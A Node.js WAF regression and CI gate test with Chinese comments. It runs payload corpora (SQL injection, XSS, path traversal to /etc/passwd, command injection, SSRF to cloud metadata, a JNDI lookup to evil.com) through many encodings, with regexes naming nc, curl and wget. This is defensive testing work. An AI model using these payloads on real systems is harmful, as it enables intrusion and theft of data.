#!/usr/bin/env node
/**
 * WAF 规则命中回归 / 门禁测试（进程内直调 src/middleware/waf.js，无网络、无数据库）
 *
 * 用法：
 *   node test/waf-fuzz.js            # 打印报告，永远 exit 0（人工排查用）
 *   node test/waf-fuzz.js --assert   # 门禁模式：判定表不达标即 exit 1（CI 用）
 *
 * ---------------------------------------------------------------------------
 * 这个脚本测什么
 * ---------------------------------------------------------------------------
 *   把「攻击载荷 × 17 种编码/变形」直接喂给 waf 中间件（假 req/res），
 *   观察它有没有拦。断言口径是**类别级**的：对每个载荷类别，
 *   「拦截到的变体数」不得低于断言表里的最低值，且「被至少拦下一个变体的
 *   （含攻击关键字的）攻击样本数」也不得低于最低值。另加一条硬断言：
 *   良性语料零拦截。
 *
 * ---------------------------------------------------------------------------
 * 这个脚本不测什么（重要，别拿它的输出当安全结论）
 * ---------------------------------------------------------------------------
 *   1. 不测「绕过率」。waf.js 是**异常评分制**（waf.js 头部 2. 段）：命中按
 *      严重度计分（critical=5 / error=4 / warning=3 / notice=2），请求总分
 *      ≥ anomalyThreshold（默认 5）才 403，单条低分命中只进监控日志、按设计放行。
 *      所以「变体被放行」绝大多数是**设计行为**，不是绕过。旧版把每次放行都
 *      算成绕过，等于把设计语义读反了 —— 本版只统计「类别里至少有一个变体被拦」，
 *      把评分语义留给 waf-fixtures.test.js 的 clean/monitor 口径去覆盖。
 *   2. 不测限流（requestGuard / express-rate-limit）、不测 IP 信誉与自动封禁
 *      （ipGuard.report → 积分 → 封禁），也不测中间件的**闸门顺序**
 *      （ipGuard → gate → waf 的先后由 server.js 装配决定，这里只调 waf 单件）。
 *      因此本脚本对「攻击者换 IP」「被封后仍能打」这类真实对抗一无所知。
 *   3. 不测 body / path / header 攻击面。只有 query 一个面（search 参数），
 *      body 与 header 面由 waf-fixtures.test.js 的 scanRequestBody 用例覆盖。
 *   4. 不覆盖 pl2/pl3 规则（默认 paranoiaLevel=1，高误杀规则在设计上不启用）。
 *   5. 不评价规则质量：某一类「拦截数」高不代表规则不会误杀，
 *      误杀由 test/waf/fixtures/benign.json（falsePositive/benign 回归）负责。
 *
 * ---------------------------------------------------------------------------
 * 相对旧版的五处口径修正（旧版是「打印统计的脚本」，不能进 CI）
 * ---------------------------------------------------------------------------
 *   口径 1（无害样本被当成绕过）：旧版对**每一次放行**都 push 进 misses，
 *     于是 `id`、`${7*7}`、`{{7*7}}`、`0x61646d696e` 这种本身不含攻击关键字、
 *     也不该被拦的探测样本，全被混进「绕过明细」。本版每个类别带一条
 *     攻击关键字正则，只有**原始载荷真的含攻击关键字**时才计入明细，
 *     并且区分「零命中放行（规则未覆盖该形态）」与「评分放行（命中但未达阈值）」
 *     两种原因 —— 前者才是规则缺口。
 *   口径 2（同进程信誉累积）：旧版所有样本共用假 IP `127.0.0.99`，
 *     每次命中都 report() 到 ipGuard，1326 次请求必然把这个 IP 打到
 *     banScore（默认 10），于是：跑一次就往 ip_bans / audit_logs 里写脏数据、
 *     触发一封封禁通知邮件，还会留下 ipGuard 的 30s 落库定时器
 *     （实测旧版 `time` 报 real 1m0.4s / user 0.2s —— 进程在等 knex 的
 *     60 秒连接超时，而不是在算）。本版从测试侧做两件事，**不改生产代码**：
 *       a) 每个样本一个唯一假 IP（10.<类别>.<载荷>.<变体>），任何单个 IP 在
 *          本进程内只被上报一次（3 分），跨样本累积在结构上不可能发生；
 *       b) 在 require waf 之前把 ipGuard 的 report/logEvent 换成空实现，
 *          让本进程不写库、不写信誉、不发邮件 —— 本脚本测的是规则命中，
 *          本来就不该产生任何安全事件。
 *     另外把 securitySettings.getConfig 固定成 DEFAULT_CONFIG 快照：否则首次
 *     调用会触发一次读库（CI 里大概率没库），结果因机器而异。
 *   口径 3（把评分语义读成绕过）：旧版用「next() 调没调」做二值判定，
 *     于是一条 warning（3 分 < 阈值 5）按设计放行也被算成绕过。本版改为
 *     类别级断言（见上），并额外对每个样本用公开的 scanAll() 复算一次分数，
 *     校验「放行 ⟺ score < 阈值」这条模型自洽不变量，防止哪天误判口径漂移。
 *   口径 4（比真实链路多解一层）：旧版对每个变体先 parseOnce(decodeURIComponent)
 *     再交给 waf，而 waf 内部还会 decodeLevel1 + decodeLevel2（内含最多 3 轮
 *     循环解码）。等于在「变体标注的编码层数」之上又多归一了一层：
 *     标注为 enc2 的样本在匹配前已经过了 3 层以上解码，比真实请求更「深度归一」，
 *     编码绕过的结论偏乐观。本版把输入定义为「waf 实际收到的值」——
 *     直接把变体交给中间件，解几层、怎么解完全由被测代码决定。
 *     （代价：本脚本不再模拟 express/qs 的解析，所以变体 enc2 等效于
 *      客户端在 URL 里发三层编码。这点是刻意取舍，写在这里免得被误读。）
 *   口径 5（Math.random 扰动）：旧版 hexCase 用 Math.random 随机化十六进制
 *     大小写，同一命令两次运行样本不同，不能当门禁。本版用 FNV-1a 派生种子 +
 *     mulberry32 PRNG，随机源只由载荷字符串决定，与遍历顺序无关。
 *
 * 退出码：`--assert` 下有任何一类未达标 / 良性语料被拦 / 模型自洽不变量失败
 *   即 process.exitCode = 1；不带参数恒为 0。
 */
'use strict';

/* ==================================================================
 * 0. 测试侧隔离（必须发生在 require waf 之前）
 * ================================================================== */

const securitySettings = require('../src/utils/securitySettings');
const ipGuard = require('../src/middleware/ipGuard');

// waf.js 加载时是 `const { report, logEvent } = require('./ipGuard')`，
// 所以必须在它 require 之前替换掉这两个出口，才能确保它拿到空实现。
const ipReports = { count: 0 };
ipGuard.report = () => { ipReports.count += 1; return false; };
ipGuard.logEvent = () => {};

// 固定配置快照：getConfig() 首次调用会异步读 security_config 表，
// 无库环境下要等到 knex 的 60s 连接超时才放行退出，且站长改过的配置会让
// 同一 commit 在不同机器上给出不同结果。门禁必须只依赖代码里的默认规则集。
const CONFIG_SNAPSHOT = JSON.parse(JSON.stringify(securitySettings.DEFAULT_CONFIG));
securitySettings.getConfig = () => CONFIG_SNAPSHOT;

const { waf, scanAll } = require('../src/middleware/waf');

const ASSERT = process.argv.slice(2).includes('--assert');
const UNKNOWN_ARGS = process.argv.slice(2).filter((a) => a !== '--assert');
const THRESHOLD = Number(CONFIG_SNAPSHOT.anomalyThreshold) || 5;

/* ==================================================================
 * 1. 确定性随机源（替代 Math.random，保证同输入同输出）
 * ================================================================== */

/** FNV-1a 32 位：把载荷字符串压成一个种子，使随机性与遍历顺序无关 */
function hashSeed(str) {
  let h = 0x811c9dc5;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return h >>> 0;
}

/** mulberry32：小而稳的 32 位 PRNG，同种子必得同序列 */
function mulberry32(seed) {
  let a = seed >>> 0;
  return function next() {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/* ==================================================================
 * 2. 编码器 / 变形器
 * ================================================================== */

const enc1 = (s) => encodeURIComponent(s);
const enc2 = (s) => encodeURIComponent(encodeURIComponent(s));
const enc3 = (s) => encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));
const ent = (s) => s.replace(/[<>"'&]/g, (ch) => ({ '<': '&#60;', '>': '&#62;', '"': '&#34;', "'": '&#39;', '&': '&#38;' }[ch]));
const uesc = (s) => s.replace(/[a-z]/gi, (ch) => `\\u${ch.charCodeAt(0).toString(16).padStart(4, '0')}`);
const full = (s) => s.replace(/[A-Za-z0-9]/g, (ch) => String.fromCharCode(ch.charCodeAt(0) + 0xfee0));

/** 口径 5：十六进制大小写扰动改用确定性 PRNG（种子取自入参，故与调用顺序无关） */
function hexCase(s) {
  const rng = mulberry32(hashSeed(s));
  return s
    .split('')
    .map((ch) => (/[a-f]/i.test(ch) ? (rng() < 0.5 ? ch.toUpperCase() : ch) : ch))
    .join('');
}

/** 17 个变体：原文 + 编码族 + 空白变形。顺序固定 —— 变更顺序会改变 IP 分配与输出 */
function variants(payload) {
  return [
    payload,
    enc1(payload),
    enc2(payload),
    enc3(payload),
    ent(payload),
    uesc(payload),
    full(payload),
    enc1(full(payload)),
    hexCase(enc2(payload)),
    enc1(ent(payload)),
    enc2(ent(payload)),
    ent(enc1(payload)),
    enc1(uesc(payload)),
    payload.replace(/\s+/g, '\t'),
    payload.replace(/\s+/g, '\n'),
    payload.replace(/\s+/g, '\v'),
    payload.replace(/\s+/g, '\\t'),
  ];
}

/* ==================================================================
 * 3. 载荷语料
 * ================================================================== */

const SQL_PAYLOADS = [
  'union select 1,2,3',
  'union all select password from users',
  "1' or '1'='1",
  "1' or 1=1 --",
  "'; drop table users; --",
  "1' union select username,password from admin --",
  "admin'--",
  "' or 1=1#",
  '1 and sleep(5)',
  '1; select pg_sleep(5)',
  "1' waitfor delay '0:0:5' --",
  '1) or (1=1',
  "1' and extractvalue(1,concat(0x7e,user())) --",
  "1'||(select load_file('/etc/passwd'))||'",
  "1' having 1=1 --",
  "1' group by 1,2,3 having 1=1 --",
  "1' into outfile '/tmp/x.php' --",
  '1/**/union/**/select/**/1',
  "1' union select @@version --",
  "1' and 1=1 and (select count(*) from information_schema.tables)>0 --",
  '0x61646d696e',
];
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src=javascript:alert(1)>',
  '" onmouseover="alert(1)',
  "'><script>alert(document.cookie)</script>",
  '<details open ontoggle=alert(1)>',
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  'javascript&#58;alert(1)',
  '&#106;avascript:alert(1)',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<svg><animate onbegin=alert(1)>',
  '<svg><set attributeName="onload" to="alert(1)">',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
];
const TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '..\\..\\..\\windows\\win.ini',
  '....//....//etc/passwd',
  '..%252f..%252fetc/passwd',
  '/etc/passwd%00.png',
  '..%c0%af..%c0%afetc/passwd',
];
const CMD_PAYLOADS = [
  '; cat /etc/passwd',
  '| whoami',
  '`id`',
  '$(id)',
  '$(cat /etc/passwd)',
  '&& dir',
  '|| echo pwned',
  'id',
  '1;id',
  '$IFS;cat$IFS/etc/passwd',
];
const SSRF_PAYLOADS = [
  'http://127.0.0.1:3306',
  'http://169.254.169.254/latest/meta-data/',
  'http://0x7f000001/',
  'http://2130706433/',
  'http://0177.0.0.1/',
  'http://[::1]/',
  'http://localhost:3000/api/health',
  'file:///etc/passwd',
  'gopher://127.0.0.1:6379/_INFO',
  'http://10.0.0.1/admin',
  'http://[::ffff:127.0.0.1]/',
];
const OTHER_PAYLOADS = [
  '${jndi:ldap://evil.com/a}',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
  '${7*7}',
  '#{7*7}',
  '%{#_memberAccess}',
  '{{7*7}}',
  '{{config}}',
  'a\r\nSet-Cookie: evil=1',
  'GET / HTTP/1.1\r\nHost: evil',
  '__proto__[polluted]=1',
  'constructor.prototype.x=1',
  '{"@type":"java.lang.Runtime"}',
  '<% exec("id") %>',
  "{{7*'7'}}",
];

/** 良性语料：真实用户会搜的东西（含技术词、符号、中文）。断言：零拦截。 */
const BENIGN_CORPUS = [
  'hello world',
  '如何用 knex 写 join 查询',
  'TypeScript 泛型约束 extends keyof',
  'React useEffect 依赖数组为空是什么意思',
  'mysql 索引优化 explain 执行计划',
  '数组去重 [...new Set(arr)] 的复杂度',
  '2026 年了还需要 jQuery 吗',
  'git rebase -i 合并多个提交',
  '正则表达式 [a-z]+ 与 \\d{3} 的区别',
  'css grid 1fr 2fr 自适应布局',
  '今天晚饭吃什么：番茄牛腩',
  'Node.js 内存泄漏排查 process.memoryUsage()',
];

/* ==================================================================
 * 4. 攻击关键字（口径 1：只有含关键字的载荷才可能被记成「规则缺口」）
 *    刻意不把裸 `id`、`${7*7}`、`{{7*7}}`、`0x61646d696e` 当成攻击 ——
 *    它们是无害探测样本，被放行是正确行为。
 * ================================================================== */

const SQL_HOSTILE = /union[\s\S]{0,20}select|or\s*\(?\s*'?1'?\s*=\s*'?1|drop\s+table|sleep\s*\(|pg_sleep|waitfor\s+delay|extractvalue|load_file|having\s+1\s*=\s*1|into\s+outfile|information_schema|@@version|admin'\s*--|\|\|\s*\(\s*select/i;
const XSS_HOSTILE = /<script|on(?:error|load|mouseover|toggle|begin|focus|click)\s*=|javascript\s*[:&]|avascript\s*:|document\.cookie|<iframe|<svg|data:text\/html|alert\s*\(/i;
const TRAV_HOSTILE = /\.\.[/\\]|\.\.%2f|\.\.%5c|%252f|%c0%af|etc[/\\%]*(?:passwd)|win\.ini|%00/i;
const CMD_HOSTILE = /;\s*(?:cat|id|whoami|dir|echo|ls|type|nc|curl|wget)\b|\|\s*(?:whoami|id|cat|sh|bash)\b|\$\(|`[^`]+`|\$IFS|&&\s*\w|\|\|\s*\w/i;
const SSRF_HOSTILE = /127\.0\.0\.1|169\.254\.169\.254|localhost|0x7f000001|2130706433|0177\.0\.0\.1|\[::1\]|::ffff:127|file:\/\/|gopher:\/\/|https?:\/\/(?:10|192\.168)\./i;
const MISC_HOSTILE = /jndi:|<!ENTITY|__proto__|constructor\.prototype|@type|%\{#_memberAccess|set-cookie:|http\/1\.1|<%\s*exec|\bexec\s*\(|\{\{\s*config\s*\}\}/i;

/* ==================================================================
 * 5. 断言表（类别 → 最低命中）。表本身就是断言的一部分：
 *    minBlocked      该类变体里至少要有多少个被 403
 *    minPayloadsHit  该类「含攻击关键字的载荷」里至少要有多少个被命中过 ≥1 个变体
 *    阈值来自实测基线，只能随规则增强往上调；调低就是放宽门禁，等于自欺。
 * ================================================================== */

const CATEGORIES = [
  { key: 'SQL', label: 'SQL 注入', payloads: SQL_PAYLOADS, hostile: SQL_HOSTILE, minBlocked: 179, minPayloadsHit: 19 },
  { key: 'XSS', label: 'XSS', payloads: XSS_PAYLOADS, hostile: XSS_HOSTILE, minBlocked: 192, minPayloadsHit: 12 },
  { key: 'TRAV', label: '路径遍历', payloads: TRAVERSAL_PAYLOADS, hostile: TRAV_HOSTILE, minBlocked: 119, minPayloadsHit: 7 },
  { key: 'CMD', label: '命令注入', payloads: CMD_PAYLOADS, hostile: CMD_HOSTILE, minBlocked: 103, minPayloadsHit: 7 },
  { key: 'SSRF', label: 'SSRF', payloads: SSRF_PAYLOADS, hostile: SSRF_HOSTILE, minBlocked: 136, minPayloadsHit: 8 },
  { key: 'MISC', label: '其他注入', payloads: OTHER_PAYLOADS, hostile: MISC_HOSTILE, minBlocked: 119, minPayloadsHit: 7 },
];

/* ==================================================================
 * 6. 执行
 * ================================================================== */

/** 构造假 req：ip 逐样本唯一（口径 2），query 直接放变体本身（口径 4） */
function mkReq(ip, searchValue) {
  return {
    ip,
    method: 'GET',
    path: '/api/articles',
    originalUrl: '/api/articles?search=' + searchValue,
    headers: { 'user-agent': 'Mozilla/5.0 Chrome/120 Safari/537.36' },
    query: { search: searchValue },
    body: {},
  };
}

/**
 * 单个样本：跑一次 waf 中间件，再用公开的 scanAll 复算分数。
 * 复算只用于解释放行原因（零命中 / 评分未达阈值），不作为判定依据 ——
 * 判定永远是中间件的实际行为（next 有没有被调）。
 */
function probeSample(ip, value) {
  const req = mkReq(ip, value);
  let released = false;
  const res = {
    set: () => {},
    status: () => ({ json: () => {} }),
  };
  waf(req, res, () => { released = true; });
  const { hits, score } = scanAll(value, 'query');
  return { released, score, hitIds: [...new Set(hits.map((h) => h.id))] };
}

const usedIps = new Set();

/** 跑一个类别：逐载荷 × 逐变体，统计样本数 / 拦截数 / 载荷覆盖 */
function runCategory(cat, catIdx) {
  const hostileReleased = [];
  const missedHostile = [];
  const mismatches = [];
  let samples = 0;
  let blocked = 0;
  let hostilePayloads = 0;
  let payloadsHit = 0;

  cat.payloads.forEach((payload, pi) => {
    const hostile = cat.hostile.test(payload);
    if (hostile) hostilePayloads += 1;
    let payloadBlocked = 0;
    let payloadMaxScore = 0;
    const vs = variants(payload);
    vs.forEach((value, vi) => {
      // 10.<类别>.<载荷>.<变体+1>：每样本一个从未用过的 IP
      const ip = `10.${catIdx}.${pi}.${vi + 1}`;
      usedIps.add(ip);
      const r = probeSample(ip, value);
      samples += 1;
      if (r.score > payloadMaxScore) payloadMaxScore = r.score;
      if (!r.released) {
        blocked += 1;
        payloadBlocked += 1;
        return;
      }
      // 口径 3 自洽校验：放行 ⟺ 复算分数低于阈值
      if (r.score >= THRESHOLD) mismatches.push({ payload, vi, value, score: r.score, hitIds: r.hitIds });
      // 口径 1：只有含攻击关键字的载荷才进「规则缺口」明细
      if (hostile) hostileReleased.push({ payload, vi, value, score: r.score, hitIds: r.hitIds });
    });
    if (payloadBlocked > 0) payloadsHit += 1;
    // 一个变体都没被拦：区分「规则完全没看见」（零命中 = 真缺口）
    // 与「看见了但单条分数不到阈值」（评分制设计行为）。混在一起说会把
    // 设计行为报成漏洞，正是旧版被读反的地方。
    else if (hostile) {
      missedHostile.push({
        payload,
        variants: vs.length,
        maxScore: payloadMaxScore,
        kind: payloadMaxScore === 0 ? 'zero-hit' : 'below-threshold',
      });
    }
  });

  return {
    key: cat.key,
    label: cat.label,
    samples,
    blocked,
    released: samples - blocked,
    hostilePayloads,
    payloadsHit,
    hostileReleased,
    missedHostile,
    mismatches,
    minBlocked: cat.minBlocked,
    minPayloadsHit: cat.minPayloadsHit,
    pass: blocked >= cat.minBlocked && payloadsHit >= cat.minPayloadsHit,
  };
}

/** 良性语料：必须零拦截 */
function runBenign() {
  const rows = [];
  BENIGN_CORPUS.forEach((text, i) => {
    const ip = `10.200.0.${i + 1}`;
    usedIps.add(ip);
    const r = probeSample(ip, text);
    if (!r.released) rows.push({ text, score: r.score, hitIds: r.hitIds });
  });
  return { total: BENIGN_CORPUS.length, blockedRows: rows, pass: rows.length === 0 };
}

/* ==================================================================
 * 7. 输出（CJK 按 2 列宽对齐）
 * ================================================================== */

const width = (s) => [...s].reduce((w, ch) => w + (ch.codePointAt(0) > 0x2e80 ? 2 : 1), 0);
const pad = (s, w) => s + ' '.repeat(Math.max(0, w - width(s)));
const lpad = (s, w) => ' '.repeat(Math.max(0, w - width(s))) + s;

function printTable(rows, withVerdict) {
  const head = withVerdict
    ? `${pad('类别', 22)}${lpad('样本数', 8)}${lpad('拦截数', 8)}${lpad('放行数', 8)}${lpad('最低拦截', 10)}${lpad('命中载荷', 10)}${lpad('最低载荷', 10)}  判定`
    : `${pad('类别', 22)}${lpad('样本数', 8)}${lpad('拦截数', 8)}${lpad('放行数', 8)}${lpad('命中载荷', 10)}${lpad('攻击载荷', 10)}`;
  console.log(head);
  for (const r of rows) {
    const name = `${r.label}(${r.key})`;
    if (!withVerdict) {
      console.log(`${pad(name, 22)}${lpad(String(r.samples), 8)}${lpad(String(r.blocked), 8)}${lpad(String(r.released), 8)}${lpad(String(r.payloadsHit), 10)}${lpad(String(r.hostilePayloads), 10)}`);
      continue;
    }
    const verdict = r.pass ? 'PASS' : 'FAIL';
    console.log(
      `${pad(name, 22)}${lpad(String(r.samples), 8)}${lpad(String(r.blocked), 8)}${lpad(String(r.released), 8)}` +
        `${lpad(String(r.minBlocked), 10)}${lpad(String(r.payloadsHit), 10)}${lpad(String(r.minPayloadsHit), 10)}  ${verdict}`
    );
  }
}

function printGapDetail(rows) {
  for (const r of rows) {
    if (!r.pass) {
      const why = [];
      if (r.blocked < r.minBlocked) why.push(`拦截 ${r.blocked} < 最低 ${r.minBlocked}`);
      if (r.payloadsHit < r.minPayloadsHit) why.push(`命中载荷 ${r.payloadsHit} < 最低 ${r.minPayloadsHit}`);
      console.log(`\n✗ ${r.key}（${r.label}）未达标：${why.join('；')}`);
      if (r.hostileReleased.length) {
        console.log('  该类放行的攻击样本明细（只列真正含攻击关键字的载荷；评分放行 = 命中但未达阈值）:');
        for (const m of r.hostileReleased) {
          const reason = m.score > 0 ? `评分放行 score=${m.score} < 阈值 ${THRESHOLD}` : '零命中放行';
          console.log(`    → [变体${m.vi}] ${JSON.stringify(m.value).slice(0, 70)}  ${reason}` +
            `${m.hitIds.length ? `  命中[${m.hitIds.join(',')}]` : ''}  ← ${JSON.stringify(m.payload).slice(0, 50)}`);
        }
      } else {
        console.log('  该类没有任何含攻击关键字的样本被放行 —— 问题在样本量/变体覆盖，不在评分阈值。');
      }
    }
  }
}

/** 模型自洽不变量：中间件的放行必须等价于「复算分数 < 阈值」。失败说明口径漂移。 */
function printMismatches(rows) {
  const bad = rows.flatMap((r) => r.mismatches.map((m) => ({ ...m, cat: r.key })));
  if (!bad.length) return 0;
  console.log(`\n! 模型自洽失败 ${bad.length} 例（中间件放行，但复算 score >= 阈值 ${THRESHOLD}）:`);
  for (const m of bad.slice(0, 10)) {
    console.log(`  → ${m.cat} ${JSON.stringify(m.value).slice(0, 60)} score=${m.score} 命中[${m.hitIds.join(',')}]`);
  }
  return bad.length;
}

/** 已知规则缺口：所有变体都放行的攻击载荷，按「零命中 / 分数不到阈值」分开展示 */
function printKnownGaps(rows) {
  const all = rows.flatMap((r) => r.missedHostile.map((m) => ({ ...m, cat: r.key })));
  const zero = all.filter((m) => m.kind === 'zero-hit');
  const below = all.filter((m) => m.kind === 'below-threshold');
  console.log(`\n已知规则缺口（不计入门禁，但必须显式可见；共 ${all.length} 条攻击载荷全变体放行）:`);
  if (!all.length) {
    console.log('  无');
    return;
  }
  if (zero.length) {
    console.log(`  · 零命中（规则没看见，${zero.length} 条）:`);
    for (const m of zero) console.log(`      ${m.cat} ${JSON.stringify(m.payload).slice(0, 66)}`);
  }
  if (below.length) {
    console.log(`  · 看见了但分数不到阈值 ${THRESHOLD}（评分制设计行为，${below.length} 条）:`);
    for (const m of below) {
      console.log(`      ${m.cat} ${JSON.stringify(m.payload).slice(0, 52)}  最高分 ${m.maxScore}/${m.variants} 变体`);
    }
  }
}

/** 报告模式（非门禁）：保留「打印明细、exit 0」的用法，只打真正的攻击缺口 */
function printReport(rows) {
  const total = rows.reduce((n, r) => n + r.samples, 0);
  const blocked = rows.reduce((n, r) => n + r.blocked, 0);
  console.log(`总计 ${total} 变体 | WAF 拦截 ${blocked} | 放行 ${total - blocked}`);
  console.log('（放行不等于绕过：waf.js 是评分制，单条低分命中按设计放行。本报告只列规则缺口。）\n');
  printTable(rows, false);

  const hostileReleased = rows.flatMap((r) => r.hostileReleased.map((m) => ({ ...m, cat: r.key })));
  console.log(`\n攻击样本放行明细（含攻击关键字，共 ${hostileReleased.length} 条变体）:`);
  if (!hostileReleased.length) {
    console.log('  无');
  } else {
    for (const m of hostileReleased) {
      const reason = m.score > 0 ? `评分放行 score=${m.score}` : '零命中';
      console.log(`  → ${m.cat} [变体${m.vi}] ${JSON.stringify(m.value).slice(0, 65)}  ${reason}`);
    }
  }

  const missed = rows.flatMap((r) => r.missedHostile.map((m) => ({ ...m, cat: r.key })));
  console.log('\n完全未覆盖的攻击样本（所有变体均放行 —— 这类才需要人工判断是不是漏洞）:');
  if (!missed.length) {
    console.log('  无 —— 每个含攻击关键字的载荷都至少被拦下一个变体');
  } else {
    for (const m of missed) {
      const why = m.kind === 'zero-hit' ? '零命中' : `最高分 ${m.maxScore} < 阈值 ${THRESHOLD}（评分放行）`;
      console.log(`  → ${m.cat} ${JSON.stringify(m.payload).slice(0, 62)}（${m.variants} 个变体全放行；${why}）`);
    }
  }

  printMismatches(rows);
  console.log('\n无害探测样本（id / ${7*7} / {{7*7}} / 0x61646d696e 等）被放行属预期，不计入明细。');
}

/**
 * 已知缺口的**数量预算**（只许减不许增）。
 *
 * 为什么需要：`printKnownGaps` 明确写着「不计入门禁，但必须显式可见」——
 * 那是**有意的**设计（评分制下「看见了但分数不到阈值」是预期行为，
 * 硬判会天天误报）。但它只打印不断言，于是**新增的绕过不会让门禁变红**。
 *
 * 这里加一层不碰安全阈值的保护：
 *   - `zero-hit`（规则**完全没看见**）必须为 **0** —— 这是规则集的漏洞，不是评分设计；
 *   - `below-threshold`（看见了但分数不到）**只许减到不超过基数**。
 *
 * 基数 12 是 2026-11 的实测值，不是「可接受的攻击面」，
 * 而是「当前状态的一个快照」：任何新增都会被抓住，要放松就得改这个数字并写明理由。
 */
const KNOWN_GAP_BUDGET = { zeroHit: 0, belowThreshold: 12 };

function printAssertSummary(rows, benign, extraOk) {
  const total = rows.reduce((n, r) => n + r.samples, 0);
  const blocked = rows.reduce((n, r) => n + r.blocked, 0);
  console.log(`\n总计 ${total} 变体 | 拦截 ${blocked} | 放行 ${total - blocked}`);
  console.log(`良性语料 ${benign.total} 条 | 拦截 ${benign.blockedRows.length} | 最低 0 | ${benign.pass ? 'PASS' : 'FAIL'}`);
  if (!benign.pass) {
    console.log('  良性语料被拦（误杀）明细:');
    for (const b of benign.blockedRows) {
      console.log(`    → ${JSON.stringify(b.text).slice(0, 60)} score=${b.score} 命中[${b.hitIds.join(',')}]`);
    }
  }
  const isolated = usedIps.size === total + benign.total;
  console.log(`样本级 IP 隔离：用到 ${usedIps.size} 个唯一假 IP / ${total + benign.total} 个样本 | ${isolated ? 'PASS' : 'FAIL'}`);

  // 缺口预算检查（见 KNOWN_GAP_BUDGET 的说明）
  const allGaps = rows.flatMap((r) => r.missedHostile.map((m) => ({ ...m, cat: r.key })));
  const zeroHit = allGaps.filter((m) => m.kind === 'zero-hit').length;
  const belowThreshold = allGaps.filter((m) => m.kind === 'below-threshold').length;
  const zeroOk = zeroHit <= KNOWN_GAP_BUDGET.zeroHit;
  const belowOk = belowThreshold <= KNOWN_GAP_BUDGET.belowThreshold;
  console.log(`缺口预算：零命中 ${zeroHit}/${KNOWN_GAP_BUDGET.zeroHit} ${zeroOk ? 'OK' : '超出'}`
    + ` | 分数不到 ${belowThreshold}/${KNOWN_GAP_BUDGET.belowThreshold} ${belowOk ? 'OK' : '超出'}`);
  if (!zeroOk) {
    console.log('  ⚠ 出现「规则完全没看见」的攻击载荷 —— 这是规则集漏洞，不是评分设计，必须补规则：');
    for (const m of allGaps.filter((x) => x.kind === 'zero-hit')) {
      console.log(`      ${m.cat} ${JSON.stringify(m.payload).slice(0, 66)}`);
    }
  }
  if (!belowOk) {
    console.log('  ⚠ 「看见了但分数不到」比基线多了 —— 需要确认是新增绕过还是载荷集扩充，'
      + '确认后改 KNOWN_GAP_BUDGET 并写明理由');
  }

  const rowsOk = rows.every((r) => r.pass);
  const ok = rowsOk && benign.pass && isolated && extraOk && zeroOk && belowOk;
  console.log(`\n结果：${ok ? 'PASS' : 'FAIL'}（exit ${ok ? 0 : 1}）`);
  return ok;
}

/* ==================================================================
 * 8. main
 * ================================================================== */

function main() {
  if (UNKNOWN_ARGS.length) {
    console.log(`[waf-fuzz] 忽略未知参数：${UNKNOWN_ARGS.join(' ')}（只认 --assert）`);
  }
  // 断言模式下静音 waf 的每次拦截告警（847 行 stderr 会把 CI 日志淹掉）；
  // 报告模式保留 stdout 明细，stderr 也照旧。
  const realWarn = console.warn;
  if (ASSERT) console.warn = () => {};

  let rows;
  let benign;
  try {
    rows = CATEGORIES.map((cat, i) => runCategory(cat, i + 1));
    benign = runBenign();
  } finally {
    console.warn = realWarn;
  }

  if (ASSERT) {
    console.log('=== WAF 规则命中断言（--assert，类别级门禁）===');
    console.log('口径：每类的「拦截数」是变体级实际 403 数；「命中载荷」是含攻击关键字且被拦下 ≥1 个变体的载荷数。\n');
    printTable(rows, true);
    printGapDetail(rows);
    printKnownGaps(rows);
    const modelBad = printMismatches(rows);
    const ok = printAssertSummary(rows, benign, modelBad === 0);
    process.exitCode = ok ? 0 : 1;
    return;
  }

  console.log('=== WAF 规则命中报告（非门禁模式：只打印，不做红绿判定）===');
  printReport(rows);
  console.log(`\n未做断言（加 --assert 才是门禁）。命中评分阈值 ${THRESHOLD}；`
    + `本次向 ipGuard 的上报共 ${ipReports.count} 次，全部被测试侧空实现拦截（未写库、未积分、未发邮件）。`);
  process.exitCode = 0;
}

main();
